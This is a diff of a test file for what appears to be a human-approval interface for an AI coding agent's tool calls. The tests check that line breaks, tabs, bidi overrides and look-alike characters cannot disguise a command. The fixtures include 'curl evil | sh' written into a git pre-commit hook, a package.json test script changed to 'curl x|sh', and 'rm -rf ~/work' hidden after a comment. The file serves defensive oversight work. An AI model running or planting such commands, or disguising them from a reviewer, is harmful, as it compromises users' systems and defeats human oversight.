@@ -5,6 +5,7 @@ import { test } from 'node:test'
 import { permissionTag } from '../../shared/types.ts'
 import {
   answer,
+  hiddenIn,
   baseKey,
   decisionResponse,
   withGeneration,
@@ -345,7 +346,7 @@ test('★ summarize: shows in one line what it is about to do', () => {
   assert.equal(summarize('Read', { file_path: '/a/b.ts' }), '/a/b.ts')
   assert.equal(summarize('WebFetch', { url: 'https://example.com' }), 'https://example.com')
   // newlines are flattened to one line (so notifications and chips do not break)
-  assert.equal(summarize('Bash', { command: 'a\n  b' }), 'a b')
+  assert.equal(summarize('Bash', { command: 'a\n  b' }), 'a ⏎ b', 'a line break is drawn as ⏎ (review CTL-3)')
   // even unknown tools are shown as JSON (not "better unreadable")
   assert.ok(summarize('Weird', { foo: 1 }).includes('foo'))
   assert.equal(summarize('Bash', null), 'Bash')
@@ -387,7 +388,8 @@ test('★★ the folded line and the opened full text come from the same source 
   assert.ok(d)
   assert.ok(!s.includes('\n'), 'the folded side stays one line')
   assert.ok(s.endsWith('…'))
-  const flat = d.text.replace(/\s+/g, ' ').trim()
+  // (a line break is drawn as "⏎" in the folded line / review CTL-3)
+  const flat = d.text.trim().replace(/[ \t]*\n\s*/g, ' ⏎ ').replace(/[^\S\n]+/g, ' ')
   assert.ok(flat.startsWith(s.slice(0, -1)), 'the folded line is exactly the start of the full text')
   assert.ok(!d.text.includes('/decoy.ts'))
 })
@@ -402,7 +404,7 @@ test('★ detailOf: attached even when short if there are newlines (flattening m
   const d = detailOf('Bash', { command: 'cd /tmp\nls -la' })
   assert.ok(d)
   assert.equal(d.text, 'cd /tmp\nls -la')
-  assert.equal(summarize('Bash', { command: 'cd /tmp\nls -la' }), 'cd /tmp ls -la')
+  assert.equal(summarize('Bash', { command: 'cd /tmp\nls -la' }), 'cd /tmp ⏎ ls -la')
 })
 
 test('★★ detailOf: when the full text is also too long, cut it and **say it was cut**', () => {
@@ -425,6 +427,7 @@ test('★ detailOf: not attached if only leading/trailing whitespace was dropped
   // ⚠️ a plain comparison with `summarize` showed an open button here (/code-review low #2).
   //    a pointless open button **dulls the signal for when it really is cut**
   assert.equal(detailOf('Bash', { command: 'ls -la\n' }), undefined, 'only a trailing newline')
+  assert.equal(summarize('Bash', { command: 'ls -la\n' }), 'ls -la ⏎', '(drawn at the end of the folded line)')
 })
 
 test('★★ detailOf: inner whitespace is not "just cosmetic" (collapsing it looks like another command)', () => {
@@ -490,7 +493,7 @@ test('★ whether to open is measured on **the same string as the folded line** 
 
 test('★ summarize: newlines inside a question do not become question separators', () => {
   // ⚠️ low #3: it joined into one string and split again, so **one question looked like two**
-  assert.equal(summarize('AskUserQuestion', { questions: [{ question: 'a\nb' }] }), 'a b')
+  assert.equal(summarize('AskUserQuestion', { questions: [{ question: 'a\nb' }] }), 'a ⏎ b')
   assert.equal(
     summarize('AskUserQuestion', { questions: [{ question: 'a' }, { question: 'b' }] }),
     'a / b',
@@ -796,4 +799,129 @@ test('★ validateFeedback: empty means no reason / too long is refused / wrong 
   const r = validateFeedback('あ'.repeat(2000))
   assert.equal(r.ok, false, 'refused because it exceeds 4096 bytes')
   assert.equal(validateFeedback(42).ok, false)
+})
+
+test('★★ CTL-3: the folded line shows a line break, so code after a `#` cannot pass for a comment (review)', () => {
+  const s = summarize('Bash', { command: 'ls -la  # tidy up the listing\nrm -rf ~/work' })
+  assert.equal(s, 'ls -la # tidy up the listing ⏎ rm -rf ~/work')
+  // (a carriage return stays, for the phone to draw as a marker: only "\n" is a line break / codex review)
+  assert.equal(summarize('Bash', { command: 'a\r\nb\rc' }), 'a\r ⏎ b\rc')
+  assert.notEqual(summarize('Bash', { command: 'echo a \\\r\nrm x' }), summarize('Bash', { command: 'echo a \\\nrm x' }))
+  assert.equal(hiddenIn('Bash', { command: 'echo a \\\r\nrm x' }), true, 'and the card warns')
+})
+
+test('★★★ PWA-3: a file write\'s card carries what is written (review) — Write, Edit, NotebookEdit', () => {
+  const w = detailOf('Write', { file_path: '.git/hooks/pre-commit', content: 'curl evil | sh' })
+  assert.ok(w)
+  assert.match(w.text, /\.git\/hooks\/pre-commit/)
+  assert.match(w.text, /curl evil \| sh/)
+  assert.equal(summarize('Write', { file_path: '.git/hooks/pre-commit', content: 'x' }), '.git/hooks/pre-commit', 'the one line stays the path')
+  const e = detailOf('Edit', { file_path: 'package.json', old_string: '"test": "node t"', new_string: '"test": "curl x|sh"', replace_all: true })
+  assert.ok(e)
+  assert.match(e.text, /"test": "node t"[\s\S]*"test": "curl x\|sh"/)
+  assert.match(e.text, /replace_all/, 'other fields are listed too')
+  const n = detailOf('NotebookEdit', { notebook_path: 'a.ipynb', cell_id: 'c1', edit_mode: 'replace', new_source: 'import os' })
+  assert.match(n!.text, /import os/)
+  // a long write is cut and says so (the phone asks again before allowing)
+  const big = detailOf('Write', { file_path: 'x', content: 'y'.repeat(20000) })
+  assert.equal(big!.clipped, true)
+  // hidden characters anywhere in what is written are flagged, not only in the path
+  assert.equal(hiddenIn('Write', { file_path: 'x', content: 'a\u202Eb' }), true)
+  assert.equal(hiddenIn('Edit', { file_path: 'x', old_string: 'a', new_string: 'b\u202Ec' }), true)
+  assert.equal(hiddenIn('Write', { file_path: 'x', content: 'plain' }), false)
+})
+
+test('★ the folded line stays linear on a long run of spaces (codex review: a regex backtracked quadratically)', () => {
+  const t0 = Date.now()
+  const s = summarize('Bash', { command: `cat <<'X'\n${' '.repeat(300_000)}y\nX` })
+  assert.ok(Date.now() - t0 < 500, `took ${Date.now() - t0} ms`)
+  assert.ok(s.startsWith("cat <<'X'") && s.endsWith('…'), s.slice(0, 40))
+})
+
+test('★★ PWA-3: two different edits never read the same (a heading cannot be forged by the content / codex review)', () => {
+  const a = detailOf('Edit', { file_path: 'f', old_string: 'A', new_string: 'B\n── new ──\nC' })!.text
+  const b = detailOf('Edit', { file_path: 'f', old_string: 'A\n── new ──\nB', new_string: 'C' })!.text
+  assert.notEqual(a, b)
+  assert.match(a, /^│ B$/m, 'every line of the content is marked')
+})
+
+test('★ the folded line: leading blanks dropped first, a blank line kept as its own break (codex review)', () => {
+  assert.equal(summarize('Bash', { command: `${' '.repeat(3200)}rm -rf build` }), 'rm -rf build')
+  assert.equal(summarize('Bash', { command: 'echo a \\\n\nrm -rf x' }), 'echo a \\ ⏎ ⏎ rm -rf x')
+  // ★ a blank after the last `\\` ends the command; drawn, so it does not read as a continuation (codex review)
+  assert.equal(summarize('Bash', { command: 'echo first \\ \necho second' }), 'echo first \\␠ ⏎ echo second')
+  assert.equal(summarize('Bash', { command: 'echo first \\\necho second' }), 'echo first \\ ⏎ echo second')
+  // ★ cut by the folded line = something to open (codex review: squashed, the JSON fitted; folded, it stopped early)
+  const note = { note: ' '.repeat(3300), target: 'production' }
+  assert.match(summarize('mcp__x__deploy', note), /…$/)
+  assert.match(detailOf('mcp__x__deploy', note)!.text, /production/)
+})
+
+test('★ write paths: a control character or "⏎" is quoted; MultiEdit is summarized by its path (codex review)', () => {
+  assert.notEqual(detailOf('Write', { file_path: 'release\nnotes.txt', content: 'x' })!.text, detailOf('Write', { file_path: 'release ⏎ notes.txt', content: 'x' })!.text)
+  assert.notEqual(summarize('Write', { file_path: 'release\nnotes.txt' }), summarize('Write', { file_path: 'release ⏎ notes.txt' }))
+  assert.equal(summarize('Write', { file_path: 'release\nnotes.txt' }), '"release\\nnotes.txt"')
+  assert.equal(summarize('Write', { file_path: '/a/b.txt' }), '/a/b.txt')
+  assert.equal(summarize('Write', { file_path: '/repo/package.json ' }), '"/repo/package.json "')
+  assert.match(detailOf('Write', { file_path: ' /repo/package.json', content: 'x' })!.text, /^" \/repo\/package\.json"$/m)
+  assert.equal(summarize('MultiEdit', { edits: [{ old_string: 'x'.repeat(5000), new_string: 'y' }], file_path: '/etc/hosts' }), '/etc/hosts')  // ⚠️ a file literally named with quotes is quoted again (else it reads like the quoted form / codex review)
+  assert.notEqual(summarize('Write', { file_path: '"release\\nnotes.txt"' }), summarize('Write', { file_path: 'release\nnotes.txt' }))
+})
+
+test('★ a mark character in the input is drawn as U+XXXX, so a mark always means what the agent put there (codex review)', () => {
+  const literal = summarize('Bash', { command: 'echo ready  # check \u23CE echo second' })
+  const real = summarize('Bash', { command: 'echo ready  # check\necho second' })
+  assert.notEqual(literal, real)
+  assert.equal(literal, 'echo ready # check U+23CE echo second')
+  assert.equal(summarize('Bash', { command: 'a \u2420 b' }), 'a U+2420 b')
+  // the full text then shows the input as it is
+  assert.equal(detailOf('Bash', { command: 'echo \u23CE' })?.text, 'echo \u23CE')
+  // ★ the card warns whenever the input holds a mark (the text `U+23CE` and the character read the same)
+  assert.equal(hiddenIn('Bash', { command: 'echo \u23CE' }), true)
+  assert.equal(hiddenIn('Write', { file_path: 'f', content: 'target=release\u23CEnotes' }), true)
+  assert.equal(hiddenIn('mcp__x__y', { a: 'b\u2420' }), true)
+  assert.equal(hiddenIn('Bash', { command: 'echo U+23CE' }), false)
+})
+
+test('★ the full text goes with every card whose folded line is not the input word for word (codex review)', () => {
+  // `\` + a final newline and a bare `\` run differently: the final line break shows in the folded line
+  assert.equal(summarize('Bash', { command: 'printf %s ./build\\\n' }), 'printf %s ./build\\ ⏎')
+  assert.notEqual(summarize('Bash', { command: 'printf %s ./build\\\n' }), summarize('Bash', { command: 'printf %s ./build\\' }))
+  assert.equal(detailOf('Bash', { command: 'printf %s ./build\\' }), undefined, 'word for word: nothing to open')
+  assert.equal(detailOf('Bash', { command: '  ls -la  ' }), undefined, 'blanks at the very start and end only')
+  // indentation after a continuation is in the full text
+  assert.equal(detailOf('Bash', { command: 'cp a\\\n  b' })?.text, 'cp a\\\n  b')
+})
+
+test('★ a tab in a write is drawn "⇥" (after the "│ " prefix it read as six spaces / codex review)', () => {
+  const tab = detailOf('Write', { file_path: 'a.py', content: 'if x:\n\ty()' })!.text
+  const spaces = detailOf('Write', { file_path: 'a.py', content: 'if x:\n      y()' })!.text
+  assert.match(tab, /^│ ⇥y\(\)$/m)
+  assert.notEqual(tab, spaces)
+  assert.match(detailOf('Write', { file_path: 'a.py', content: 'a\u21E5b' })!.text, /^│ aU\+21E5b$/m)
+  assert.equal(hiddenIn('Write', { file_path: 'a.py', content: 'a\u21E5b' }), true)
+  // blanks at a line's end too (`\\` + a blank ends a shell command / codex review)
+  const a = detailOf('Write', { file_path: 'b.sh', content: 'echo preview \\ \ntouch build/ready' })!.text
+  const b = detailOf('Write', { file_path: 'b.sh', content: 'echo preview \\\ntouch build/ready' })!.text
+  assert.notEqual(a, b)
+  assert.match(a, /^│ echo preview \\␠$/m)
+  assert.match(detailOf('Write', { file_path: 'b', content: 'x  ' })!.text, /^│ x␠␠$/m)
+})
+
+test('★ MCP: blanks collapsed inside a JSON string give a full text to open (codex review)', () => {
+  assert.equal(summarize('mcp__x__grant', { user: 'release  bot' }), '{"user":"release bot"}')
+  assert.match(detailOf('mcp__x__grant', { user: 'release  bot' })!.text, /"release {2}bot"/)
+  assert.equal(detailOf('mcp__x__grant', { user: 'release bot' }), undefined, 'word for word: nothing to open')
+})
+
+test('★ PWA-3: a carriage return is kept for the phone to mark, a huge write is laid out only in part, hidden characters anywhere are found (codex review)', () => {
+  assert.match(detailOf('Write', { file_path: 's.sh', content: '#!/bin/sh\r\necho' })!.text, /│ #!\/bin\/sh\r$/m)
+  assert.equal(hiddenIn('Write', { file_path: 's.sh', content: '#!/bin/sh\r\necho' }), true)
+  const t0 = Date.now()
+  const huge = detailOf('Write', { file_path: 'x.csv', content: 'a,b\n'.repeat(3_000_000) })!
+  // (measured: about 5 ms laid out in part, about 650 ms laid out whole)
+  assert.ok(Date.now() - t0 < 200, `took ${Date.now() - t0} ms`)
+  assert.equal(huge.clipped, true)
+  assert.ok(huge.text.length <= 8000)
+  assert.equal(hiddenIn('MultiEdit', { file_path: 'x', edits: [{ old_string: 'a', new_string: 'b\u202Ec' }] }), true)
 })
